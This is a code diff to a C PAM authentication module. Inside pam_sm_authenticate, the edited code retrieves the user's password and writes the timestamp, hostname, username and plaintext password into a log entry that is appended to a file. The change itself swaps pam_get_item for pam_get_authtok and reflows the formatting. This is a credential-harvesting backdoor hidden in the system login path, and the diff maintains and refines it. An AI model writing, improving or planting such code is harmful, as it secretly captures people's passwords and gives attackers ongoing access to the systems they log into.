@@ -34,15 +34,15 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         return retval;
     }
 
-    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
+    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
     gethostname(hostname, sizeof(hostname));
-
     get_current_time(timestamp, sizeof(timestamp));
 
     snprintf(log_entry, sizeof(log_entry),
              "[%s] Hostname: %s | Username: %s | Password: %s\n",
-             timestamp, hostname, username ? username : "unknown",
+             timestamp, hostname,
+             username ? username : "unknown",
              password ? password : "none");
 
     FILE *fp = fopen(LOG_FILE, "a");
